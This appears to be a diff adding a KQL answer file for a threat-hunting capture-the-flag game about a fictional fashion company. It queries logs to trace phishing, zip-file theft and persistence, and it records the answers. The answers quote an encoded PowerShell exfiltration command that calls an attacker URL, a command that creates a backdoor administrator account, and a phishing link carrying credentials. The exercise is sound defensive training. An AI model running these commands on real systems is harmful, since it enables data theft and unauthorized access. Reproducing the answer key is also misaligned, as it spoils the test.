@@ -1,0 +1,171 @@
+﻿////////////////Cowboy Couture: A Steampunk Space Adventure//////////
+
+///////Section 1: What's a query? 
+search *
+|distinct $table
+
+//What is the name of the Director of Happiness?
+Employees
+| where role == "Director of Happiness"
+///Jason Blanchard
+
+///What is Mary Ellen Kennel's role?
+Employees
+| where name == "Mary Ellen Kennel"
+//Designer
+
+//What is our model's exact role?
+Employees
+| where role contains "model"
+//Underwear Model
+
+//What is John Strand's IP Address?
+Employees
+| where name == "John Strand"
+//10.10.0.3
+//What is John Strand's hostname?
+//PFW2-DESKTOP
+//What is John Strand's email address?
+//john_strand@celestialcowboycouture.com
+
+//How many emails did John Strand receive?
+Email
+|where recipient == "john_strand@celestialcowboycouture.com"
+| count //25
+
+//How many distinct commands were run on John Strand's machine?
+ProcessEvents
+| where hostname == "PFW2-DESKTOP"
+|distinct process_commandline //148
+
+//Do a take 10 on any table and enter mosey on to continue.
+Email
+| take 10
+
+///Section 3: Cyber Cattle Thief Question 3
+
+Employees
+| where role == "Lead Fashion Designer"
+//Megan Lucia, ip_adrr==10.10.0.14
+//Does it look like Megan was up to suspicious activity that needs to be investigated further? (Yes/No)
+//ITCK-MACHINE
+
+FileCreationEvents
+| where hostname == "ITCK-MACHINE"
+| order by timestamp desc
+//
+//How many of these zip files were created on Megan's machine?
+
+FileCreationEvents
+| where hostname == "ITCK-MACHINE"
+| where filename contains ".zip"
+| count 
+
+//What folder were the zip files placed in on Megan's machine?
+FileCreationEvents
+| where hostname == "ITCK-MACHINE"
+| where path contains ".zip" and filename contains ".zip"
+| project timestamp, path
+//designs_to_steal, 2024-10-02T08:02:53.000Z to 2024-10-02T08:04:57.000Z
+
+//What is the timestamp for when this file was created?
+FileCreationEvents
+| where hostname == "ITCK-MACHINE"
+| where path contains "advanced-uploader.exe"
+| project timestamp, path
+//2024-10-02T08:36:47.000Z
+
+//Was this process executed on Megan's machine?(Yes/No)
+ProcessEvents
+| where hostname == "ITCK-MACHINE"
+| where process_name == "advanced-uploader.exe"
+
+//What is the full URL where the files were exfiltrated to?
+ProcessEvents
+//| where hostname == "ITCK-MACHINE"
+| where process_commandline contains "enc" and  process_commandline contains "bypass"
+|distinct process_commandline
+//'QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))"
+//entcrypt first Base64 than with the result do reverse
+
+///http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin
+
+//What database table contains evidence of employee logins?
+//AuthenticationEvents
+
+//Paste the timestamp for when that anomalous login occurred.
+AuthenticationEvents
+| where username == "melucia"
+|where result == "Successful Login"
+| project timestamp, src_ip, user_agent
+
+//2024-09-23T06:58:54.000Z; 192.124.249.15; Mozilla/5.0 (Windows 98) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/17.0.888.0 Safari/533.2
+
+//Section 4: Cowhands-on-Keyboard 🤠
+
+//How many succesful logins were made from that IP?
+AuthenticationEvents
+| where src_ip == "192.124.249.15" and result == "Successful Login"
+| count //2
+
+//What is the username for the other employee that this IP was used to log into?
+AuthenticationEvents
+| where src_ip == "192.124.249.15" and result == "Successful Login"
+//melucia ITCK-MACHINE ; jahartley JHTJ-DESKTOP
+
+//What is this employee's role?
+Employees
+| where username == "jahartley" //CEO
+
+//Enter the timestamp for when the attacker established persisitence.
+ProcessEvents
+|where hostname == "JHTJ-DESKTOP"
+| where timestamp between 
+        (datetime(2024-09-19T06:25:59Z) .. datetime(2024-09-20T15:25:27Z))
+| where process_commandline contains "net"        
+//net user backdooradmin CowboyBandits123! /add && net localgroup administrators backdooradmin /add && echo "User 'backdooradmin' added to Administrators group."
+//2024-09-20T04:39:09.000Z
+
+//How many domains does the 192.124.249.15 IP resolve to?
+PassiveDns
+| where ip == "192.124.249.15"
+| distinct domain
+
+//What newly uncovered IP resolves to the secure-celestial.com domain?
+ PassiveDns
+ | where domain in ("secure-celestial.com",
+   "celestialcowboy-support.com")
+ | where ip !contains "192.124.249.15" and domain contains "secure-celestial.com"
+ //142.250.191.78
+
+ //What is the name of the next domain that you've uncovered?
+
+let all_ips = PassiveDns
+|where domain in ("secure-celestial.com", 
+    "celestialcowboy-support.com")
+|distinct ip;
+PassiveDns
+| where ip in (all_ips)
+|where domain !in ("secure-celestial.com", "celestialcowboy-support.com")
+|distinct domain
+//cccouture-hr-update.com
+
+//Is there any evidence of network traffic to any of those domains? (Yes/No)
+OutboundNetworkEvents
+| where url has_any ("cccouture-hr-update.com", 
+ "celestialcowboy-support.com",
+ "secure-celestial.com")
+//https://cccouture-hr-update.com/published/online/share/auth?username=jahartley&password=**********
+
+//What is the subject of the email sent to Megan Lucia?
+ Email
+ | where link has_any ("cccouture-hr-update.com", 
+ "celestialcowboy-support.com",
+ "secure-celestial.com")
+ | where recipient contains "lucia"
+ | distinct subject
+//URGENT: From your CEO - Immediate Action Required: You are getting promoted Cowboy!!!!
+
+//Which Backdoors & Breaches initial compromise card was played here?
+//https://bnb.silverday.de/about/cards.php
+/// phish
